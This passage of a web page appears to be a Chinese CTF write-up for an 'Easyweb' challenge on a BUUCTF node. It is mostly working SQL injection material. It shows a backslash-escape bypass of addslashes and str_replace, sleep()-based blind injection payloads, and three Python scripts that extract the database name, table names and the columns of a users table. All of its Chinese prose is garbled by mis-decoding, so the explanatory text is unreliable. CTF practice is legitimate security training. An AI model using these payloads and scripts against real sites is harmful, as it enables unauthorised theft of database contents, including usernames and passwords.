class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;<br>å½“$id=&#x27;\&#x27;æ—¶(è¿›å…¥sqlè¯­å¥ä¸­æ—¶ï¼Œ&#x27;&#x27;ä¼šè‡ªåŠ¨å»é™¤)ï¼Œ$path=&#x27;xxx&#x27;<br>sqlè¯­å¥å˜åŒ–=&gt;<br>select * from images where id=&#x27;\&#x27; or path=&#x27;xxx&#x27;<br>ç”±äºç¬¬äºŒä¸ª&#x27;è¢«è½¬ä¹‰äº†ï¼Œå°±ä¸å‚ä¸å¯¹&#x27;çš„é—­åˆä½œç”¨ï¼Œè€Œæ˜¯ä½œä¸ºä¸€ä¸ªå†…å®¹ã€‚è€Œç¬¬ä¸€ä¸ª&#x27;éœ€è¦è¿›è¡Œé—­åˆï¼Œå°±ä¼šå‘åå¯»æ‰¾é—­åˆ&#x27;,æ‰€ä»¥å°±ä¼šå°†pathåé¢çš„ç¬¬ä¸€ä¸ª&#x27;ä½œä¸ºé—­åˆå¯¹è±¡è¿›è¡Œé—­åˆï¼Œæœ€ç»ˆè¾¾åˆ°çš„æ•ˆæœå°±æ˜¯:<br>id = &#x27;\&#x27; or path=&#x27;<br>è€Œxxxå°±å¯ä»¥ä½œä¸ºæˆ‘ä»¬æ³¨å…¥çš„å†…å®¹è¿›è¡Œsqlæ³¨å…¥äº†<br>xxx=&gt;xxx#=&gt;or 1=1 #<br>sqlè¯­å¥å˜åŒ–ä¸º<br>=&gt;<br>select * from images where id=&#x27;\&#x27; or path=&#x27; or 1=1 #&#x27;<br><br>id=\<br>&amp;path= or 1=1 #<br></code></pre></td></tr></table></figure><h2 id="ç”±äº-è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¦è¿›è¡Œç»•è¿‡ï¼š"><a href="#ç”±äº-è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¦è¿›è¡Œç»•è¿‡ï¼š" class="headerlink" title="ç”±äº\è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¦è¿›è¡Œç»•è¿‡ï¼š"></a>ç”±äº\è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¦è¿›è¡Œç»•è¿‡ï¼š</h2><h3 id="åˆ©ç”¨phpçš„æ›¿ä»£å‡½æ•°è¿›è¡ŒåŒå†™ç»•è¿‡æ³•"><a href="#åˆ©ç”¨phpçš„æ›¿ä»£å‡½æ•°è¿›è¡ŒåŒå†™ç»•è¿‡æ³•" class="headerlink" title="åˆ©ç”¨phpçš„æ›¿ä»£å‡½æ•°è¿›è¡ŒåŒå†™ç»•è¿‡æ³•:"></a>åˆ©ç”¨phpçš„æ›¿ä»£å‡½æ•°è¿›è¡ŒåŒå†™ç»•è¿‡æ³•:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">$id=addslashes($id);//ç‰¹æ®Šå­—ç¬¦:null,&#x27;,&quot;,\<br>$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);<br>å¯ä»¥è®©id=&#x27;\\0&#x27;<br>=&gt;ç»è¿‡addå‡½æ•°<br>=&gt;\\\0<br>=&gt;ç»è¿‡replace<br>=&gt;\<br></code></pre></td></tr></table></figure><h4 id="æµ‹è¯•æ—¶é—´ç›²æ³¨payload"><a href="#æµ‹è¯•æ—¶é—´ç›²æ³¨payload" class="headerlink" title="æµ‹è¯•æ—¶é—´ç›²æ³¨payload:"></a>æµ‹è¯•æ—¶é—´ç›²æ³¨payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=\\0&amp;path= or if(1=1,sleep(5),1) #<br>=&gt;æœ‰æ—¶å€™éœ€è¦è¿›è¡Œurlç¼–ç ï¼Œæ‰èƒ½æˆåŠŸ<br>?id=\\0&amp;path=%20or%20if(1=1,sleep(5),1)%23<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130143837533.png" alt="image-20240130143837533"></p><p>ä½¿ç”¨ç¬¬äºŒä¸ªpayloadï¼Œå¯ä»¥å‘ç°ç½‘é¡µå“åº”ç¡®å®å»¶è¿Ÿäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥payloadè¿›è¡Œæ—¶é—´ç›²æ³¨</p><h2 id="æ„é€ æ—¶é—´ç›²æ³¨è„šæœ¬"><a href="#æ„é€ æ—¶é—´ç›²æ³¨è„šæœ¬" class="headerlink" title="æ„é€ æ—¶é—´ç›²æ³¨è„šæœ¬:"></a>æ„é€ æ—¶é—´ç›²æ³¨è„šæœ¬:</h2><h3 id="çˆ†æ•°æ®åº“å"><a href="#çˆ†æ•°æ®åº“å" class="headerlink" title="çˆ†æ•°æ®åº“å:"></a>çˆ†æ•°æ®åº“å:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br><span class="hljs-comment"># æµ‹è¯•</span><br><span class="hljs-comment"># payload = 1/**/and/**/if(ascii(substr(database(),1,1))&gt;32,sleep(5),1)#</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># å¯¹æ•°æ®åº“åå­—ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œæš´åŠ›å‰–è§£</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># æ‰‹åŠ¨è§„å®šæ•°æ®åº“åå­—é•¿åº¦</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># mysqlçš„if(æ¡ä»¶,ç»“æœ1,ç»“æœ2):æ¡ä»¶æ­£ç¡®åˆ™ä¸ºç»“æœ1ï¼Œæ¡ä»¶ä¸ºflaseä¸ºç»“æœ2</span><br>        <span class="hljs-comment"># payload = &quot;1/**/and/**/if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(5),1)#&quot;.format(n,tmp)</span><br>        payload = <span class="hljs-string">&quot;\\0&amp;path=%20or%20if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(3),1)%23&quot;</span>.<span class="hljs-built_in">format</span>(n,tmp)<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-comment"># å¼€å§‹è®°æ—¶</span><br>        start_time = time.time()<br>        r = requests.get(url+payload)<br>        <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">3</span>):<br>            <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„ç¬¬%dä¸ªå­—ç¬¦:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># å¯¹ä¸‹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼š&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130150912831.png" alt="image-20240130150912831"></p><p>çˆ†å‡ºæ•°æ®åº“åä¸ºciscnfinal</p><h3 id="çˆ†æ•°æ®åº“è¡¨ä¿¡æ¯ï¼š"><a href="#çˆ†æ•°æ®åº“è¡¨ä¿¡æ¯ï¼š" class="headerlink" title="çˆ†æ•°æ®åº“è¡¨ä¿¡æ¯ï¼š"></a>çˆ†æ•°æ®åº“è¡¨ä¿¡æ¯ï¼š</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=\\0&amp;path=%20&#x27;</span><br><span class="hljs-comment"># table_lenå­˜å‚¨æ¯å¼ è¡¨çš„é•¿åº¦</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = []<br><span class="hljs-comment"># indexå­˜å‚¨ç°åœ¨å¤„ç†çš„æ˜¯ç¬¬index+1å¼ è¡¨</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># ç”±äºè·å–çš„æ˜¯æ‰€æœ‰è¡¨åæ€»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦éå†ä¸€æ¬¡å³å¯</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># nè¡¨ç¤ºå½“å‰å¤„ç†çš„è¡¨æ‰€å¤„ç†çš„æ˜¯ç¬¬nä¸ªå­—ç¬¦</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># mysqlçš„if(æ¡ä»¶,ç»“æœ1,ç»“æœ2):æ¡ä»¶æ­£ç¡®åˆ™ä¸ºç»“æœ1ï¼Œæ¡ä»¶ä¸ºflaseä¸ºç»“æœ2</span><br>            <span class="hljs-comment"># payload = &quot;1&#x27;/**/and/**/if(ascii(substr((seLEct(GROUP_CONCAT(TABLE_NAME))from(infoRmation_schema.tables)where(TABLE_SCHEMA/**/like/**/&#x27;ctf&#x27;)),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(5),1)#&quot;.format(n, tmp)</span><br>            payload = <span class="hljs-string">&quot;or%20if(ascii(substr((seLEct(GROUP_CONCAT(TABLE_NAME))from(infoRmation_schema.tables)where(table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),1)%23&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-comment"># å¼€å§‹è®°æ—¶</span><br>            start_time = time.time()<br>            r = requests.get(url+payload)<br>            <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">2</span>):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># å­˜å‚¨è¯¥è¡¨çš„è¡¨å</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># æ‰“å°è¯¥è¡¨çš„è¡¨å</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&#123;&#125;å¼ è¡¨çš„åå­—ä¸º&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªè¡¨</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130152438544.png" alt="image-20240130152438544"></p><p>çˆ†å‡ºè¡¨çš„ä¿¡æ¯ä¸º:images,users</p><h3 id="çˆ†è¡¨çš„å­—æ®µï¼Œè¿™é‡Œç›´æ¥çˆ†usersè¡¨çš„"><a href="#çˆ†è¡¨çš„å­—æ®µï¼Œè¿™é‡Œç›´æ¥çˆ†usersè¡¨çš„" class="headerlink" title="çˆ†è¡¨çš„å­—æ®µï¼Œè¿™é‡Œç›´æ¥çˆ†usersè¡¨çš„:"></a>çˆ†è¡¨çš„å­—æ®µï¼Œè¿™é‡Œç›´æ¥çˆ†usersè¡¨çš„:</h3><p>ç”±äºpayloadè¦ç”¨åˆ°å¯¹æ•°æ®è¡¨çš„ç­›é€‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨16è¿›åˆ¶æ¥ä»£è¡¨æ•°æ®è¡¨è¿›è¡Œç»•è¿‡</p><p><img src="/images/2023-08-20-Easyweb/image-20240130160952607.png" alt="image-20240130160952607"></p><p>usersçš„16è¿›åˆ¶ä¸º0x7573657273</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=\\0&amp;path=%20&#x27;</span><br><br><span class="hljs-comment"># table_col_numå­˜å‚¨æ¯å¼ è¡¨æ¯ä¸ªå­—æ®µæ‰€å¯¹åº”çš„é•¿åº¦</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;usersç¬¬1å­—æ®µçš„é•¿åº¦&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = [<span class="hljs-string">&#x27;users&#x27;</span>]<br><span class="hljs-comment"># col_countå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µæ•°</span><br><span class="hljs-comment"># å°†æ‰€æœ‰å­—æ®µåˆåœ¨ä¸€èµ·è¾“å‡ºå°±æ˜¯åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>col_count = &#123;<span class="hljs-string">&#x27;users&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_nameå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µçš„åå­—</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆå¯¹è¡¨è¿›è¡Œéå†,åªæœ‰è¡¨F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># å½“å‰è¡¨çš„åå­—:table_name[table_index]</span><br>    <span class="hljs-comment"># col_numå­˜å‚¨å½“å‰è¡¨çš„å­—æ®µæ•°</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># å¯¹å½“å‰è¡¨çš„å­—æ®µè¿›è¡Œéå†ï¼Œè·å–å…¨éƒ¨å­—æ®µåï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_keyå­˜å‚¨å½“å‰è¡¨å½“å‰å­—æ®µçš„key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;ç¬¬&#123;&#125;å­—æ®µçš„é•¿åº¦&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_lenå­˜å‚¨å½“å‰å­—æ®µçš„é•¿åº¦</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># éå†å½“å‰å­—æ®µ</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># nameå­˜å‚¨å½“å‰å­—æ®µçš„åç§°</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>            <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># payload = &quot;1/**/and/**/if(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME/**/like/**/&#x27;flag&#x27;)),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(5),1)#&quot;.format(col_len_index+1, tmp)</span><br>                payload = <span class="hljs-string">&#x27;or%20if(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=0x7573657273)),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),1)%23&#x27;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-built_in">print</span>(payload)<br>                <span class="hljs-comment"># å¼€å§‹è®°æ—¶</span><br>                start_time = time.time()<br>                r = requests.get(url+payload)<br>                <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">2</span>):<br>                    <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># å­˜å‚¨å½“å‰å­—æ®µçš„åç§°:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;çš„ç¬¬&#123;&#125;ä¸ªå­—æ®µçš„åå­—&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—æ®µ</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€å¼ è¡¨</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130161721449.png" alt="image-20240130161721449"></p><p>å¾—åˆ°å­—æ®µä¸ºusernameå’Œpassword</p><h3 id="çˆ†å­—æ®µçš„å€¼"><a href="#çˆ†å­—æ®µçš„å€¼" class="headerlink" title="çˆ†å­—æ®µçš„å€¼:"></a>çˆ†å­—æ®µçš„å€¼:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 